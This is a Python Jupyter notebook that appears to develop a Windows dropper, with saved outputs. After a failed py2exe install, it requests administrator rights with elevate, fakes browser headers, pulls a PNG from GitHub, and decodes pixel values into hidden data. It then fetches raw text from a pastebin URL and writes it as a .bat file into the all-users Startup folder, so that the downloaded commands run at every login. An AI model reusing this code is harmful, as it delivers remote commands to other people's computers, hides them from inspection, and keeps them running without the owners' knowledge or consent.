{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.0-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "Python 3.9.0 64-bit",
   "display_name": "Python 3.9.0 64-bit",
   "metadata": {
    "interpreter": {
     "hash": "63fd5069d213b44bf678585dea6b12cceca9941eaf7f819626cde1f2670de90d"
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "source": [
    "# Information for Reference\n",
    "## RickPic URL\n",
    "https://i.imgur.com/7oMTBQM.jpg\n",
    "## Powershell Script\n",
    "https://bit.ly/3oWJvFP"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Requirement already satisfied: wheel in c:\\python39\\lib\\site-packages (0.35.1)\n"
     ]
    }
   ],
   "source": [
    "! python -m pip install wheel"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Collecting py2exe\n",
      "  Using cached py2exe-0.10.0.2.tar.gz (104 kB)\n",
      "Requirement already satisfied: cachetools in c:\\python39\\lib\\site-packages (from py2exe) (4.1.1)\n",
      "Requirement already satisfied: pefile in c:\\python39\\lib\\site-packages (from py2exe) (2019.4.18)\n",
      "Requirement already satisfied: future in c:\\python39\\lib\\site-packages (from pefile->py2exe) (0.18.2)\n",
      "Building wheels for collected packages: py2exe\n",
      "  Building wheel for py2exe (setup.py): started\n",
      "  Building wheel for py2exe (setup.py): finished with status 'error'\n",
      "  Running setup.py clean for py2exe\n",
      "Failed to build py2exe\n",
      "Installing collected packages: py2exe\n",
      "    Running setup.py install for py2exe: started\n",
      "    Running setup.py install for py2exe: finished with status 'error'\n",
      "  ERROR: Command errored out with exit status 1:\n",
      "   command: 'C:\\Python39\\python.exe' -u -c 'import sys, setuptools, tokenize; sys.argv[0] = '\"'\"'C:\\\\Users\\\\IEUser\\\\AppData\\\\Local\\\\Temp\\\\pip-install-bf5wtcw_\\\\py2exe\\\\setup.py'\"'\"'; __file__='\"'\"'C:\\\\Users\\\\IEUser\\\\AppData\\\\Local\\\\Temp\\\\pip-install-bf5wtcw_\\\\py2exe\\\\setup.py'\"'\"';f=getattr(tokenize, '\"'\"'open'\"'\"', open)(__file__);code=f.read().replace('\"'\"'\\r\\n'\"'\"', '\"'\"'\\n'\"'\"');f.close();exec(compile(code, __file__, '\"'\"'exec'\"'\"'))' bdist_wheel -d 'C:\\Users\\IEUser\\AppData\\Local\\Temp\\pip-wheel-dsvkf02j'\n",
      "       cwd: C:\\Users\\IEUser\\AppData\\Local\\Temp\\pip-install-bf5wtcw_\\py2exe\\\n",
      "  Complete output (52 lines):\n",
      "  running bdist_wheel\n",
      "  running build\n",
      "  running build_py\n",
      "  creating build\n",
      "  creating build\\lib\n",
      "  copying zipextimporter.py -> build\\lib\n",
      "  creating build\\lib\\py2exe\n",
      "  copying py2exe\\boot_common.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\boot_ctypes_com_server.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\boot_service.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\build_exe.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\distutils_buildexe.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\dllfinder.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\hooks.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\icons.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\mf3.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\mf34.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\patch_distutils.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\pescan.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\py2exe_distutils.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\resources.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\runtime.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\setup_template.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\versioninfo.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\_wapi.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\__init__.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\__main__.py -> build\\lib\\py2exe\n",
      "  copying py2exe\\MIT-License.txt -> build\\lib\\py2exe\n",
      "  copying py2exe\\MPL2-License.txt -> build\\lib\\py2exe\n",
      "  running build_interpreters\n",
      "  building 'py2exe.run' extension\n",
      "  creating build\\temp.win-amd64-3.9\n",
      "  creating build\\temp.win-amd64-3.9\\Release\n",
      "  creating build\\temp.win-amd64-3.9\\Release\\source\n",
      "  C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.27.29110\\bin\\HostX86\\x64\\cl.exe /c /nologo /Ox /W3 /GL /DNDEBUG /MD -DPYTHONDLL=\\\"python39.dll\\\" -D_CRT_SECURE_NO_WARNINGS=1 -DPy_BUILD_CORE=1 -IC:\\Python39\\include -IC:\\Python39\\include -IC:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.27.29110\\include -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\ucrt -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\shared -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\um -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\winrt -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\cppwinrt /Tcsource/run.c /Fobuild\\temp.win-amd64-3.9\\Release\\source/run.obj -IC:\\Program Files\\Microsoft SDKs\\Windows\\v7.0\\Include -IC:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\VC\\include -IC:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.10586.0\\ucrt\n",
      "  run.c\n",
      "  C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.27.29110\\bin\\HostX86\\x64\\cl.exe /c /nologo /Ox /W3 /GL /DNDEBUG /MD -DPYTHONDLL=\\\"python39.dll\\\" -D_CRT_SECURE_NO_WARNINGS=1 -DPy_BUILD_CORE=1 -IC:\\Python39\\include -IC:\\Python39\\include -IC:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.27.29110\\include -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\ucrt -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\shared -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\um -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\winrt -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\cppwinrt /Tcsource/start.c /Fobuild\\temp.win-amd64-3.9\\Release\\source/start.obj -IC:\\Program Files\\Microsoft SDKs\\Windows\\v7.0\\Include -IC:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\VC\\include -IC:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.10586.0\\ucrt\n",
      "  start.c\n",
      "  source/start.c(284): error C2017: illegal escape sequence\n",
      "  source/start.c(284): error C2001: newline in constant\n",
      "  source/start.c(285): error C2143: syntax error: missing ')' before 'if'\n",
      "  source/start.c(289): error C2065: 'hgbl': undeclared identifier\n",
      "  source/start.c(289): warning C4047: '=': 'int' differs in levels of indirection from 'HGLOBAL'\n",
      "  source/start.c(291): error C2065: 'hgbl': undeclared identifier\n",
      "  source/start.c(291): warning C4022: 'LockResource': pointer mismatch for actual parameter 1\n",
      "  source/start.c(292): error C2017: illegal escape sequence\n",
      "  source/start.c(292): error C2001: newline in constant\n",
      "  source/start.c(293): error C2143: syntax error: missing ')' before '}'\n",
      "  source/start.c(292): error C2198: 'MyLoadLibrary': too few arguments for call\n",
      "  source/start.c(299): error C2017: illegal escape sequence\n",
      "  source/start.c(299): error C2001: newline in constant\n",
      "  error: command 'C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\2019\\\\BuildTools\\\\VC\\\\Tools\\\\MSVC\\\\14.27.29110\\\\bin\\\\HostX86\\\\x64\\\\cl.exe' failed with exit code 2\n",
      "  ----------------------------------------\n",
      "  ERROR: Failed building wheel for py2exe\n",
      "    ERROR: Command errored out with exit status 1:\n",
      "     command: 'C:\\Python39\\python.exe' -u -c 'import sys, setuptools, tokenize; sys.argv[0] = '\"'\"'C:\\\\Users\\\\IEUser\\\\AppData\\\\Local\\\\Temp\\\\pip-install-bf5wtcw_\\\\py2exe\\\\setup.py'\"'\"'; __file__='\"'\"'C:\\\\Users\\\\IEUser\\\\AppData\\\\Local\\\\Temp\\\\pip-install-bf5wtcw_\\\\py2exe\\\\setup.py'\"'\"';f=getattr(tokenize, '\"'\"'open'\"'\"', open)(__file__);code=f.read().replace('\"'\"'\\r\\n'\"'\"', '\"'\"'\\n'\"'\"');f.close();exec(compile(code, __file__, '\"'\"'exec'\"'\"'))' install --record 'C:\\Users\\IEUser\\AppData\\Local\\Temp\\pip-record-k7rp4yfm\\install-record.txt' --single-version-externally-managed --compile --install-headers 'C:\\Python39\\Include\\py2exe'\n",
      "         cwd: C:\\Users\\IEUser\\AppData\\Local\\Temp\\pip-install-bf5wtcw_\\py2exe\\\n",
      "    Complete output (52 lines):\n",
      "    running install\n",
      "    running build\n",
      "    running build_py\n",
      "    creating build\n",
      "    creating build\\lib\n",
      "    copying zipextimporter.py -> build\\lib\n",
      "    creating build\\lib\\py2exe\n",
      "    copying py2exe\\boot_common.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\boot_ctypes_com_server.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\boot_service.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\build_exe.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\distutils_buildexe.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\dllfinder.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\hooks.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\icons.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\mf3.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\mf34.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\patch_distutils.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\pescan.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\py2exe_distutils.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\resources.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\runtime.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\setup_template.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\versioninfo.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\_wapi.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\__init__.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\__main__.py -> build\\lib\\py2exe\n",
      "    copying py2exe\\MIT-License.txt -> build\\lib\\py2exe\n",
      "    copying py2exe\\MPL2-License.txt -> build\\lib\\py2exe\n",
      "    running build_interpreters\n",
      "    building 'py2exe.run' extension\n",
      "    creating build\\temp.win-amd64-3.9\n",
      "    creating build\\temp.win-amd64-3.9\\Release\n",
      "    creating build\\temp.win-amd64-3.9\\Release\\source\n",
      "    C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.27.29110\\bin\\HostX86\\x64\\cl.exe /c /nologo /Ox /W3 /GL /DNDEBUG /MD -DPYTHONDLL=\\\"python39.dll\\\" -D_CRT_SECURE_NO_WARNINGS=1 -DPy_BUILD_CORE=1 -IC:\\Python39\\include -IC:\\Python39\\include -IC:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.27.29110\\include -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\ucrt -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\shared -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\um -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\winrt -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\cppwinrt /Tcsource/run.c /Fobuild\\temp.win-amd64-3.9\\Release\\source/run.obj -IC:\\Program Files\\Microsoft SDKs\\Windows\\v7.0\\Include -IC:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\VC\\include -IC:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.10586.0\\ucrt\n",
      "    run.c\n",
      "    C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.27.29110\\bin\\HostX86\\x64\\cl.exe /c /nologo /Ox /W3 /GL /DNDEBUG /MD -DPYTHONDLL=\\\"python39.dll\\\" -D_CRT_SECURE_NO_WARNINGS=1 -DPy_BUILD_CORE=1 -IC:\\Python39\\include -IC:\\Python39\\include -IC:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.27.29110\\include -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\ucrt -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\shared -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\um -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\winrt -IC:\\Program Files (x86)\\Windows Kits\\10\\include\\10.0.18362.0\\cppwinrt /Tcsource/start.c /Fobuild\\temp.win-amd64-3.9\\Release\\source/start.obj -IC:\\Program Files\\Microsoft SDKs\\Windows\\v7.0\\Include -IC:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\VC\\include -IC:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.10586.0\\ucrt\n",
      "    start.c\n",
      "    source/start.c(284): error C2017: illegal escape sequence\n",
      "    source/start.c(284): error C2001: newline in constant\n",
      "    source/start.c(285): error C2143: syntax error: missing ')' before 'if'\n",
      "    source/start.c(289): error C2065: 'hgbl': undeclared identifier\n",
      "    source/start.c(289): warning C4047: '=': 'int' differs in levels of indirection from 'HGLOBAL'\n",
      "    source/start.c(291): error C2065: 'hgbl': undeclared identifier\n",
      "    source/start.c(291): warning C4022: 'LockResource': pointer mismatch for actual parameter 1\n",
      "    source/start.c(292): error C2017: illegal escape sequence\n",
      "    source/start.c(292): error C2001: newline in constant\n",
      "    source/start.c(293): error C2143: syntax error: missing ')' before '}'\n",
      "    source/start.c(292): error C2198: 'MyLoadLibrary': too few arguments for call\n",
      "    source/start.c(299): error C2017: illegal escape sequence\n",
      "    source/start.c(299): error C2001: newline in constant\n",
      "    error: command 'C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\2019\\\\BuildTools\\\\VC\\\\Tools\\\\MSVC\\\\14.27.29110\\\\bin\\\\HostX86\\\\x64\\\\cl.exe' failed with exit code 2\n",
      "    ----------------------------------------\n",
      "ERROR: Command errored out with exit status 1: 'C:\\Python39\\python.exe' -u -c 'import sys, setuptools, tokenize; sys.argv[0] = '\"'\"'C:\\\\Users\\\\IEUser\\\\AppData\\\\Local\\\\Temp\\\\pip-install-bf5wtcw_\\\\py2exe\\\\setup.py'\"'\"'; __file__='\"'\"'C:\\\\Users\\\\IEUser\\\\AppData\\\\Local\\\\Temp\\\\pip-install-bf5wtcw_\\\\py2exe\\\\setup.py'\"'\"';f=getattr(tokenize, '\"'\"'open'\"'\"', open)(__file__);code=f.read().replace('\"'\"'\\r\\n'\"'\"', '\"'\"'\\n'\"'\"');f.close();exec(compile(code, __file__, '\"'\"'exec'\"'\"'))' install --record 'C:\\Users\\IEUser\\AppData\\Local\\Temp\\pip-record-k7rp4yfm\\install-record.txt' --single-version-externally-managed --compile --install-headers 'C:\\Python39\\Include\\py2exe' Check the logs for full command output.\n"
     ]
    }
   ],
   "source": [
    "! python -m pip install \"py2exe\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "from PIL import Image\n",
    "import requests\n",
    "from elevate import elevate\n",
    "import os\n",
    "import io\n",
    "import platform\n",
    "import subprocess"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# OS determination\n",
    "runningOS = platform.system().lower()\n",
    "detectedOS = \"\"\n",
    "if runningOS == \"linux\" or runningOS == \"linux2\":\n",
    "    exit\n",
    "elif runningOS == \"windows\":\n",
    "    detectedOS = \"windows\"\n",
    "elif runningOS == \"darwin\":\n",
    "    detectedOS = \"mac\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "SystemExit",
     "evalue": "1",
     "traceback": [
      "An exception has occurred, use %tb to see the full traceback.\n",
      "\u001b[1;31mSystemExit\u001b[0m\u001b[1;31m:\u001b[0m 1\n"
     ]
    }
   ],
   "source": [
    "# Check File Permissions\n",
    "elevate()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Dictionary of headers for Windows, Mac, and Linux\n",
    "headers_dict = {'windows':{\"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\",\n",
    "        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\",\n",
    "        \"Sec-Fetch-Site\": \"same-origin\",\n",
    "        \"Sec-Fetch-Mode\": \"navigate\",\n",
    "        \"Sec-Fetch-User\": \"?1\",\n",
    "        \"Sec-Fetch-Dest\": \"document\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"Accept-Encoding\": \"gzip, deflate, br\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.9\"},'darwin':{\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.5\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"DNT\": \"1\",\n",
    "        \"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\"},'linux':{\"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.5\",\n",
    "        \"Accept-Encoding\": \"gzip, deflate, br\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"DNT\": \"1\",\n",
    "        \"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\"}}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "# User Agent Creation\n",
    "userAgent = headers_dict.get(runningOS)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "# Image Retrieval\n",
    "response = requests.get(\"https://github.com/BuriedButBreathing/AcidArrow/blob/master/Test.png?raw=true\", headers=userAgent)\n",
    "print(response)\n",
    "imageBytes = io.BytesIO(response.content)\n",
    "img = Image.open(imageBytes)\n",
    "imgData = list(img.getdata())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "[32, 34, 36, 39, 40, 41, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 93, 95, 123, 124, 125]\n"
     ]
    }
   ],
   "source": [
    "# Scrape values from Image\n",
    "usefulValues = []\n",
    "pixelValues = []\n",
    "for t in imgData:\n",
    "    for x in t:\n",
    "        pixelValues.append(x)\n",
    "for value in pixelValues:\n",
    "    if value < 126 and value != 0:\n",
    "        usefulValues.append(value)\n",
    "del usefulValues[-2:]\n",
    "print(usefulValues)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Got all the values\n"
     ]
    }
   ],
   "source": [
    "# Verify Values\n",
    "if sum(usefulValues) != 3683:\n",
    "    print('Missing Values')\n",
    "else:\n",
    "    print('Got all the values')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "PermissionError",
     "evalue": "[Errno 13] Permission denied: 'C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\helloworld.bat'",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mPermissionError\u001b[0m                           Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-9-c6cb60f49281>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      2\u001b[0m \u001b[0mr\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mrequests\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mget\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"https://pastebin.com/raw/6iC4PUNm\"\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mheaders\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0muserAgent\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      3\u001b[0m \u001b[0mp\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mr\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcontent\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 4\u001b[1;33m \u001b[1;32mwith\u001b[0m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\helloworld.bat'\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m'wb'\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0mf\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      5\u001b[0m     \u001b[0mf\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mwrite\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mp\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mPermissionError\u001b[0m: [Errno 13] Permission denied: 'C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\helloworld.bat'"
     ]
    }
   ],
   "source": [
    "# Command Retrieval\n",
    "r = requests.get(\"https://pastebin.com/raw/6iC4PUNm\", headers=userAgent)\n",
    "p = r.content\n",
    "with open('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\helloworld.bat', 'wb') as f:\n",
    "    f.write(p)"
   ]
  }
 ]
}